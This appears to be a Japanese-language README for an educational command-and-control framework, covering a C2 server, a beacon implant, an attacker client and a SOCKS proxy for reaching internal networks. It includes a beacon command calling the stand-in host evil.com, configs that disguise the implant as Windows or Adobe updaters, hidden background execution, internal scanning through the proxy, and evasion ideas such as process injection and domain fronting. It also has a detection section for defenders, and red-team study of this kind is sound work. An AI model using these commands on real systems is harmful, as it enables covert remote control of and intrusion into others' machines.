# C2フレームワーク - 学習用Command & Controlシステム

[![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)](https://python.org)
[![License](https://img.shields.io/badge/License-Educational-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20|%20Linux%20|%20macOS-lightgrey.svg)]()

学習目的で開発された軽量C2（Command & Control）フレームワークです。ペネトレーションテストの基礎概念、赤チーム演習、サイバーセキュリティ研究に活用できます。

⚠️ **重要**: このツールは教育・学習目的専用です。承認されていないシステムでの使用は法的に禁止されています。

## 📋 目次

- [特徴](#-特徴)
- [アーキテクチャ](#-アーキテクチャ)
- [システム要件](#-システム要件)
- [インストール](#-インストール)
- [クイックスタート](#-クイックスタート)
- [詳細な使用方法](#-詳細な使用方法)
- [設定](#-設定)
- [機能説明](#-機能説明)
- [トラブルシューティング](#-トラブルシューティング)
- [セキュリティ注意事項](#-セキュリティ注意事項)
- [学習リソース](#-学習リソース)
- [ライセンス](#-ライセンス)

## 🚀 特徴

- **3台構成アーキテクチャ**: 実際のAPT攻撃を模した分離型設計
- **SOCKSプロキシ機能**: ターゲットネットワーク内部への横展開
- **Beacon機能**: 定期的チェックイン、ジッター、ステルス機能
- **攻撃者専用クライアント**: 直感的なコマンドラインインターフェース
- **柔軟な設定**: コマンドライン引数、設定ファイル対応
- **クロスプラットフォーム**: Windows、Linux、macOS対応
- **最小依存関係**: Python標準ライブラリのみ使用

## 🏗️ アーキテクチャ

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│  攻撃者マシン    │    │   C2サーバ      │    │ ターゲットマシン │
│                │    │                │    │                │
│ ┌─────────────┐ │    │ ┌─────────────┐ │    │ ┌─────────────┐ │
│ │Attackerクライ││◄───┤ │C2サーバ     │ │◄───┤ │Beacon       │ │
│ │アント       │ │    │ │             │ │    │ │             │ │
│ └─────────────┘ │    │ │- Beacon管理 │ │    │ │- チェックイン│ │
│                │    │ │- タスク配信 │ │    │ │- コマンド実行│ │
│ ┌─────────────┐ │    │ │- 結果中継   │ │    │ │- 結果送信   │ │
│ │SOCKS Client │ │    │ └─────────────┘ │    │ └─────────────┘ │
│ │(プロキシ利用)│◄────┤ │              │ │    │                │
│ └─────────────┘ │    │ ┌─────────────┐ │    │                │
└─────────────────┘    │ │SOCKSプロキシ │ │    └─────────────────┘
                      │ │             │ │
                      │ │- 内部探査   │ │
                      │ │- 横展開支援 │ │
                      │ └─────────────┘ │
                      └─────────────────┘
```

### 通信ポート
- **4444**: C2通信（Beacon ↔ サーバ、攻撃者 ↔ サーバ）
- **1080**: SOCKSプロキシ（攻撃者 → ターゲットネットワーク）

## 📋 システム要件

- **Python**: 3.7以上
- **OS**: Windows 10+、Linux（Ubuntu 18.04+、CentOS 7+）、macOS 10.14+
- **メモリ**: 最低512MB
- **ネットワーク**: TCP/UDP通信可能な環境

## 💾 インストール

### 1. リポジトリクローン
```bash
git clone https://github.com/your-repo/c2-framework.git
cd c2-framework
```

### 2. 依存関係確認
```bash
python3 --version  # 3.7以上であることを確認
```

### 3. ファイル構成確認
```
c2-framework/
├── updated_c2_server.py    # C2サーバ
├── attacker_client.py      # 攻撃者クライアント
├── lightweight_beacon.py   # Beacon
├── config_examples/        # 設定ファイル例
│   ├── config.txt
│   ├── stealth_config.txt
│   └── dev_config.txt
└── README.md
```

## 🔥 クイックスタート

### 学習環境での基本テスト

#### 1. C2サーバ起動
```bash
# ターミナル1: C2サーバ
python3 updated_c2_server.py --host 0.0.0.0 --c2-port 4444 --socks-port 1080
```

#### 2. Beacon接続（別マシンまたは別ターミナル）
```bash
# ターミナル2: Beacon
python3 lightweight_beacon.py -s 127.0.0.1 -p 4444 --beacon-id test_beacon
```

#### 3. 攻撃者クライアント接続
```bash
# ターミナル3: 攻撃者クライアント
python3 attacker_client.py -s 127.0.0.1 -p 4444
```

#### 4. 基本操作
```bash
C2> beacons                    # Beacon一覧表示
C2> use test_beacon           # Beacon選択
C2[test_beacon]> whoami       # コマンド実行
C2[test_beacon]> pwd          # 現在ディレクトリ確認
C2[test_beacon]> ls           # ファイル一覧
```

## 📖 詳細な使用方法

### C2サーバ

#### 基本起動
```bash
python3 updated_c2_server.py
```

#### カスタムポート
```bash
python3 updated_c2_server.py --host 192.168.1.100 --c2-port 8080 --socks-port 8081
```

#### 外部接続許可
```bash
python3 updated_c2_server.py --host 0.0.0.0
```

### Beacon

#### 基本接続
```bash
python3 lightweight_beacon.py -s <C2サーバIP> -p 4444
```

#### 高度な設定
```bash
# カスタムBeacon ID、チェックイン間隔
python3 lightweight_beacon.py -s 192.168.1.100 -p 4444 \
  --beacon-id corporate_pc_001 \
  --sleep 60 \
  --jitter 0.4

# ステルスモード
python3 lightweight_beacon.py -s evil.com -p 443 \
  --stealth \
  --user-agent "Windows Security Update"
```

#### 設定ファイル使用
```bash
# 設定ファイル作成
cat > beacon_config.txt << EOF
server=192.168.1.100
port=4444
beacon_id=target_workstation
sleep=45
jitter=0.3
stealth=true
user_agent=Microsoft Update Service
EOF

# 設定ファイルで実行
python3 lightweight_beacon.py -c beacon_config.txt
```

#### バックグラウンド実行
```bash
# Linux/macOS
nohup python3 lightweight_beacon.py -c config.txt > /dev/null 2>&1 &

# Windows
pythonw lightweight_beacon.py -c config.txt
```

### 攻撃者クライアント

#### 接続
```bash
python3 attacker_client.py -s <C2サーバIP> -p 4444
```

#### コマンド一覧
```bash
# 基本コマンド
beacons                    # アクティブBeacon表示
use <beacon_id>           # Beacon選択
clear                     # 選択解除
help                      # ヘルプ表示
quit                      # 終了

# Beacon操作
cmd <command>             # コマンド送信
info [beacon_id]          # Beacon詳細情報
history                   # コマンド履歴

# 直接入力（Beacon選択後）
whoami                    # ユーザー確認
pwd                       # 現在ディレクトリ
ls / dir                  # ファイル一覧
ps / tasklist            # プロセス一覧
```

### SOCKSプロキシ活用

#### curl使用例
```bash
# 内部Webサーバアクセス
curl --socks5 <C2サーバIP>:1080 http://192.168.10.100:8080

# HTTPSサイト
curl --socks5 <C2サーバIP>:1080 https://internal.company.com
```

#### nmap使用例
```bash
# 内部ネットワークスキャン
nmap --proxies socks5://<C2サーバIP>:1080 192.168.10.0/24

# ポートスキャン
nmap --proxies socks5://<C2サーバIP>:1080 -p 80,443,22,3389 192.168.10.100
```

#### ブラウザ設定
```
プロキシ設定:
- Type: SOCKS v5
- Host: <C2サーバIP>
- Port: 1080
```

## ⚙️ 設定

### 設定ファイル例

#### 基本設定 (config.txt)
```ini
# C2サーバ設定
server=192.168.1.100
port=4444

# Beacon設定
beacon_id=office_pc_001
sleep=30
jitter=0.3

# オプション
stealth=false
user_agent=Windows Update Client
```

#### ステルス設定 (stealth_config.txt)
```ini
# 高度なステルス設定
server=legitimate-cdn.com
port=443

# 長いチェックイン間隔
sleep=300
jitter=0.6

# 完全ステルス
stealth=true
user_agent=Adobe Flash Player Updater
```

#### 開発用設定 (dev_config.txt)
```ini
# 開発・テスト用
server=127.0.0.1
port=4444
sleep=10
jitter=0.1
stealth=false
beacon_id=dev_test
```

### 環境変数設定
```bash
export C2_SERVER="192.168.1.100"
export C2_PORT="4444"
export BEACON_ID="env_beacon"
```

## 🔧 機能説明

### Beacon機能
- **定期チェックイン**: 設定可能な間隔でC2サーバに接続
- **ジッター**: ランダムな遅延で検知回避
- **コマンド実行**: システムコマンド、内蔵コマンド対応
- **ファイルダウンロード**: Base64エンコードでファイル取得
- **ステルス機能**: プロセス名偽装、出力抑制
- **再接続機能**: 接続断時の自動復旧

### 内蔵コマンド
```bash
# ディレクトリ操作
cd <path>                 # ディレクトリ変更
pwd                       # 現在ディレクトリ表示
ls / dir                  # ファイル一覧

# システム情報
whoami                    # 現在ユーザー
sysinfo                   # 詳細システム情報
ps / tasklist            # プロセス一覧

# ファイル操作
download <filepath>       # ファイルダウンロード

# Beacon制御
sleep <seconds>          # チェックイン間隔変更
kill                     # Beacon終了
```

### C2サーバ機能
- **マルチクライアント**: 複数Beacon、攻撃者クライアント同時接続
- **タスクキューイング**: オフライン時のコマンド蓄積
- **リアルタイム結果配信**: 実行結果の即座転送
- **死活監視**: 5分間無応答でBeacon削除
- **SOCKSプロキシ**: SOCKS5プロトコル完全実装

## 🛠️ トラブルシューティング

### よくある問題

#### 1. 接続できない
```bash
# ファイアウォール確認
sudo ufw status                    # Ubuntu
sudo firewall-cmd --list-all      # CentOS
netsh advfirewall show allprofiles # Windows

# ポート開放
sudo ufw allow 4444/tcp           # Ubuntu
sudo firewall-cmd --add-port=4444/tcp --permanent  # CentOS
```

#### 2. "Address already in use"エラー
```bash
# ポート使用状況確認
netstat -tulpn | grep 4444       # Linux
netstat -ano | findstr 4444      # Windows

# プロセス終了
kill -9 <PID>                    # Linux
taskkill /PID <PID> /F           # Windows
```

#### 3. Beaconがタイムアウト
```bash
# ネットワーク接続確認
ping <C2サーバIP>
telnet <C2サーバIP> 4444

# チェックイン間隔延長
python3 lightweight_beacon.py -s <server> --sleep 60
```

#### 4. JSON decode エラー
```bash
# 文字エンコーディング確認
export PYTHONIOENCODING=utf-8     # Linux
set PYTHONIOENCODING=utf-8        # Windows

# Python3使用確認
python3 --version
```

### ログ確認
```bash
# サーバログ
python3 updated_c2_server.py 2>&1 | tee c2_server.log

# Beaconデバッグ
python3 lightweight_beacon.py -s <server> --config debug_config.txt
```

### パフォーマンス調整
```bash
# 軽量設定
sleep=60          # チェックイン間隔延長
jitter=0.1        # ジッター最小化
stealth=true      # 出力抑制
```

## 🔒 セキュリティ注意事項

### ⚠️ 法的責任
- **承認されたテスト環境でのみ使用**
- **事前の書面による許可を取得**
- **適用法令の遵守**
- **悪用は厳禁**

### 🛡️ 防御側の検知ポイント
このツールは学習目的であり、実際の環境では以下の方法で検知される可能性があります:

#### ネットワーク検知
```bash
# 定期的な通信パターン
- 固定間隔での外部通信
- JSON形式のペイロード
- 平文通信（暗号化なし）
```

#### ホスト検知
```bash
# プロセス監視
- Pythonプロセスの実行
- 外部への定期接続
- システムコマンドの実行
```

#### 対策改善案（学習用）
```bash
# 通信暗号化
- TLS/SSL実装
- カスタム暗号化

# トラフィック偽装
- HTTP/HTTPS通信模倣
- ドメインフロンティング

# ホスト対策
- メモリ実行
- プロセスインジェクション
- 正規プロセス偽装
```

### 🔐 セキュア運用（学習用）
```bash
# 設定ファイル保護
chmod 600 config.txt
chown root:root config.txt

# 一時ファイル削除
rm -rf /tmp/beacon_*
```

## 📚 学習リソース

### 推奨学習順序
1. **基礎概念**: C2通信の仕組み理解
2. **実習**: ローカル環境でのテスト
3. **ネットワーク**: SOCKSプロキシ活用
4. **検知**: 防御側の視点
5. **改良**: 機能追加・改善

### 関連技術
- **ペネトレーションテスト**: Metasploit、Cobalt Strike
- **ネットワーク**: TCP/IP、プロキシ、VPN
- **暗号化**: TLS/SSL、対称暗号
- **ステガノグラフィ**: データ隠蔽技術
- **フォレンジック**: ログ解析、マルウェア分析

### 実践演習アイデア
1. **Red Team**: 攻撃シナリオの実践
2. **Blue Team**: 検知ルール作成
3. **Purple Team**: 攻防一体の演習
4. **インシデント対応**: 侵害発生時の対処

## 📄 ライセンス

```
Educational License

このソフトウェアは教育・学習目的でのみ使用を許可します。
商用利用、悪意のある使用は禁止されています。

使用者は以下に同意するものとします:
- 承認されたテスト環境でのみ使用
- 適用法令の遵守
- 責任ある情報開示
- セキュリティ研究の発展への貢献

詳細: LICENSE ファイルを参照
```

## 🤝 貢献

学習目的でのコントリビューションを歓迎します:
- バグレポート
- 機能改善
- ドキュメント改善
- セキュリティ強化

## 📞 サポート

- **Issues**: GitHub Issues
- **教育機関**: academic@example.com
- **研究用途**: research@example.com

---

**免責事項**: このツールは教育目的で作成されています。使用者は自身の責任において、適用法令を遵守して使用してください。開発者は本ツールの不適切な使用に対して一切の責任を負いません。

**最終更新**: 2025年8月

---

Happy Learning! 🎓🔒
